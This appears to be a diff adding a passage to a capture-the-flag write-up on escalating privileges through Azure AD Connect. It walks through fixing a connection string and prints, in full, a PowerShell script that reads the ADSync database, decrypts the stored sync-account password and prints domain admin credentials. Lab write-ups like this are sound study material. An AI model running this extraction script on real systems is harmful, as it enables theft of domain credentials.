@@ -143,9 +143,143 @@ Right now, our senses are tingling. Because, we have a lot of signs pointing tow
 So we go ahead and do some googling :D
 
 ### Research
-We decide to use a broad term in our first search to make things easier for ourselves. We type: "Azure AD Sync Privilege Escalation"
+We decide to use a broad term in our first search to make things easier for ourselves. We type in: "Azure AD Sync Privilege Escalation"
 
 and we get this blog post [here](https://blog.xpnsec.com/azuread-connect-for-redteam/):
 
 ![privesc-blog](privesc-blog.jpg)
 
+In the post, we learn that Azure AD Connect is a tool for integrating between both Active Directory Deployments and Azure AD.
+
+It has the Password Hash Syncronization (PHS) feature which "uploads user accounts and password hashes from Active Directory to Azure".
+
+We also learn that, during the setup, an AD account is used to perform the sync process. And is granted the necessary permissions to be able to access all the domain hashes.
+
+One more thing we notice, is that the credentials for the synchronization account are located in the local database included in the installation process.
+
+And, even though they are encrypted, the key to decrypt them is also present in the same database.
+
+### Using the PowerShell Script
+Thanks to the researcher "Adam Chester", he had already created a script that takes care of all this and dumps us the stored credentials if we have access to the database.
+
+We're going to use a brief command to try connecting to the local database to see if we have access: `sqlcmd -Q "SELECT name FROM master.dbo.sysdatabases"`
+
+Seems like we do!
+
+![database-access](database-access.jpg)
+
+We're going to try using the script provided on the blog. 
+
+The script runs, but stops right after it prints its banner and we lose the shell.
+
+![script-fail](script-fail.jpg)
+
+### Troubleshooting
+Since the script isn't big (< 40 lines) We're going to step through it line-by-line to find out what's failing.
+
+we get the first 5 lines.
+
+```
+Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"
+
+$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
+$client.Open()
+$cmd = $client.CreateCommand()
+
+```
+
+And start by running the part which defines how the script will connect to the database a.k.a the "connection string".
+
+`$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"`
+
+which runs okay, because we're not really taking any action. just initializing an object of the type "System.Data.SqlClient.SqlConnection".
+
+We get the error on the `$client.Open()` part.
+
+![sql-error](sql-error.jpg)
+
+Reading the sentences in the error tells us something about network-related errors and trying to reach the SQL server remotely.
+
+we confirm this by consulting the Microsoft Documentation for connection strings [here](https://docs.microsoft.com/en-us/dotnet/api/system.data.sqlclient.sqlconnection.connectionstring?view=dotnet-plat-ext-6.0#system-data-sqlclient-sqlconnection-connectionstring).
+
+it says the "Data Source" is for the "The name or network address of the instance of SQL Server to which to connect." which tells us this is not for a local DB.
+
+![Data-Source-Doc](Data-Source-Doc.jpg)
+
+so we change it up and just use `localhost` instead. But, we get a different error:
+
+![sql-login-error](sql-login-error.jpg)
+
+Seems that the connection string way doesn't use our `mhope` user credentials.
+
+Looking again at the Microsoft Documentation, we find info related to authentication:
+
+![sql-auth](sql-auth.jpg)
+
+After modyfing the connection string, we get no errors when opening the connection:
+
+![correct-conn-string](correct-conn-string.jpg)
+
+### Enough Troubleshooting. Let me some creds!
+After modifying the connection string, let's go over what the script does in brief:
+
+1. Defining the connection string: we're connecting to the ADSync DB on the local computer with windows authentication
+```
+$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=localhost;Initial Catalog=ADSync;Integrated Security=true;"
+$client.Open()
+$cmd = $client.CreateCommand()
+```
+
+2. Querying for the important bits to do the decryption: `keyset_id`, `instance_id` and `entropy` from the `mms_server_configuration` table
+```
+$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
+$reader = $cmd.ExecuteReader()
+$reader.Read() | Out-Null
+$key_id = $reader.GetInt32(0)
+$instance_id = $reader.GetGuid(1)
+$entropy = $reader.GetGuid(2)
+$reader.Close()
+```
+
+3. Obtaining the configuration items: `private_configuration_xml` and `encrypted_configuration` from the `mms_management_agent` table
+```
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
+$reader = $cmd.ExecuteReader()
+$reader.Read() | Out-Null
+$config = $reader.GetString(0)
+$crypted = $reader.GetString(1)
+$reader.Close()
+```
+
+4. Loading the `mcrypt.dll` into memory and carrying out the decryption using the extracted keys from Step #1
+```
+add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
+$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+$km.LoadKeySet($entropy, $instance_id, $key_id)
+$key = $null
+$km.GetActiveCredentialKey([ref]$key)
+$key2 = $null
+$km.GetKey(1, [ref]$key2)
+$decrypted = $null
+$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
+```
+
+5. Selecting the domain, username and password from the XML-formatted output and outputting them to the screen
+```
+$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
+$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
+$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}
+
+Write-Host ("Domain: "   + $domain.Domain)
+Write-Host ("Username: " + $username.Username)
+Write-Host ("Password: " + $password.Password)
+```
+
+With everything in place, we run the script and get a clean set of creds:
+
+![domain-admin-creds](domain-admin-creds.jpg)
+
+The creds are good and we've owned the box :D
+
+![rooted](rooted.jpg)
